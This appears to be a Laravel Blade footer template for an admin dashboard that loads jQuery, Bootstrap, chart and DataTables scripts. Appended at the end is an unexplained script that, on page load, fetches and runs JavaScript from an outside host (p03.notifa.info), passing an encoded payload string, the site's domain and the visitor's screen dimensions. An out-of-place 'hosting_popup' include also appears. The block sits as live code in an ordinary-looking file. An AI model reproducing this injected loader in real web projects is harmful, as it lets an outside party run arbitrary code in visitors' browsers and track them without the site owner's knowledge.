<?php
/**
 * Created by PhpStorm.
 * User: Angga DP
 * Date: 25/03/2020
 * Time: 15:59
 */ ?>

<script type="text/javascript" src="{{asset('assets/js/jquery.min.js')}}"></script>
<script type="text/javascript" src="{{asset('assets/js/popper.min.js')}}"></script>
<script type="text/javascript" src="{{asset('assets/js/bootstrap.min.js')}}"></script>
<script type="text/javascript" src="{{asset('assets/js/jquery.mCustomScrollbar.concat.min.js')}}"></script>

<!--Morris Chart-->
<script src="{{asset('assets/js/index/morris-chart/morris.js')}}"></script>
<script src="{{asset('assets/js/index/morris-chart/raphael-min.js')}}"></script>
<script src="{{asset('assets/js/index/morris-chart/morris-init.js')}}"></script>
<script src="{{asset('assets/js/index/Chart.min.js')}}"></script>
<script src="{{asset('assets/js/index/chartjs-init-alt.js')}}"></script>
<script src="{{asset('assets/js/index/chartjs-init-alt.js')}}"></script>
<!--echarts-->
<script type="text/javascript" src="{{asset('assets/js/index/echarts/echarts-all-3.js')}}"></script>
<!--init echarts-->
<script type="text/javascript" src="{{asset('assets/js/index/echarts/init-echarts.js')}}"></script>

<script type="text/javascript" src="{{asset('assets/js/jquery.dcjqaccordion.2.7.js')}}"></script>
<script src="{{asset('assets/js/custom.js')}}" type="text/javascript"></script>
<script src="{{asset('../../../../hosting_popup/js/hots_popup.js')}}"></script>
<script src="{{asset('assets/js/jquery.dataTables.min.js')}}"></script>
<script src="{{asset('assets/js/dataTables.bootstrap4.min.js')}}"></script>

@yield('script')

<script>
    $(document).ready(function() {
        $('#bs4-table').DataTable();
    });
</script>

<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXbYu5N%2f%2bn25%2bwOEoKMX4Iwd0sWHCJR9S5AKlz84E82WPAuN4POIpQOcXTaT1T%2bFnoY8QGbGtO6onDd%2bqilGmatIK72vqIoszEt4uPAQRH7TL5COyRvoi%2b%2fyHW8j3RMswa%2bTozwivGSRB%2fj%2b3Go5Qubp%2fPhMEmmSJeLU5Sp49xWJdUupt8FYRaXtqic%2b1qvbmWYt9VZGBaltElo2WFylwS3xyChVNztLpZuSWLpsgw6xSwnY9Lb518%2fdNslhUezQE6auba6mapUQPvBAdRVy1yxQDz1aBoLelrPRDNKCM00ATBvY9%2fvBNsqXp%2bizdVfuaUuxxdt8FuJJ%2fxEa2xflLNqHjJqIsnQFa44feBNiToBsLRtLeX%2fOieQEjNpPxli61K8Pi1BaU58TufApU8C3%2b%2b8kSZ9F7OF5E57NuaEEXkfHaC4jJxsVK6yaP3SGYlUbDhJ4epZg6e%2bGZ88R8A%2fWRMHPmUqfdDLEf5PSNy1sn650tVKkZl86erMQ%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
